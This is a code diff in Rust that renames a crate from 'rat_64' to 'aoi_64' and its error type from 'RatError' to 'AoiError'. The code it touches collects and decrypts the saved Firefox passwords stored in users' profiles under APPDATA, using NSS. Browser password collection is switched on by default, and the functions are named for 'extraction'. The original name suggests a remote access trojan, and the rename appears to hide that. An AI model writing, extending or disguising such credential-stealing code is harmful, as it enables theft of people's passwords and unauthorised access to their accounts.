@@ -1,4 +1,4 @@
-use rat_64::{Config, RatError};
+﻿use aoi_64::{Config, AoiError};
 use serde::{Deserialize, Serialize};
 use std::time::{SystemTime, UNIX_EPOCH};
 
@@ -76,7 +76,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-fn load_extraction_config() -> Result<Config, RatError> {
+fn load_extraction_config() -> Result<Config, AoiError> {
     let mut config = Config::default();
     config.collect_browser_passwords = true;
     if let Ok(config_content) = std::fs::read_to_string("config.json") {
@@ -100,8 +100,8 @@ fn print_extraction_config(config: &Config) {
 }
 
 #[cfg(feature = "browser")]
-async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, RatError> {
-    use rat_64::collectors::password_manager::{
+async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, AoiError> {
+    use aoi_64::collectors::password_manager::{
         CredentialsBackend, JsonCredentials, SqliteCredentials,
     };
 
@@ -170,12 +170,12 @@ async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, Ra
 }
 
 #[cfg(not(feature = "browser"))]
-async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, RatError> {
-    Err(RatError::Config("Browser feature not enabled".to_string()))
+async fn collect_firefox_passwords_detailed() -> Result<Vec<BrowserPassword>, AoiError> {
+    Err(AoiError::Config("Browser feature not enabled".to_string()))
 }
 
 #[cfg(feature = "browser")]
-fn get_firefox_profiles() -> Result<Vec<std::path::PathBuf>, RatError> {
+fn get_firefox_profiles() -> Result<Vec<std::path::PathBuf>, AoiError> {
     let mut profiles = Vec::new();
     if let Some(appdata) = std::env::var_os("APPDATA") {
         let appdata_path = std::path::PathBuf::from(appdata);
@@ -226,8 +226,8 @@ fn detect_firefox_browser_type(path: &std::path::Path) -> &'static str {
 async fn collect_with_advanced_nss(
     profile_path: &std::path::Path,
     browser_name: &str,
-) -> Result<Vec<BrowserPassword>, RatError> {
-    use rat_64::collectors::password_manager::NssCredentials;
+) -> Result<Vec<BrowserPassword>, AoiError> {
+    use aoi_64::collectors::password_manager::NssCredentials;
     let mut passwords = Vec::new();
     let nss_creds = NssCredentials::new(profile_path.to_path_buf());
     match nss_creds.get_decrypted_logins() {
@@ -243,7 +243,7 @@ async fn collect_with_advanced_nss(
             }
         }
         Err(e) => {
-            return Err(RatError::Config(format!("NSS decryption failed: {}", e)));
+            return Err(AoiError::Config(format!("NSS decryption failed: {}", e)));
         }
     }
     Ok(passwords)
@@ -255,7 +255,7 @@ async fn attempt_decrypt_nss_credentials(
     encrypted_username: &str,
     encrypted_password: &str,
 ) -> (String, String) {
-    use rat_64::collectors::firefox_nss::Nss;
+    use aoi_64::collectors::firefox_nss::Nss;
     if let Ok(nss) = Nss::new() {
         if nss.initialize(profile_path).is_ok() {
             let username = if encrypted_username.is_empty() {
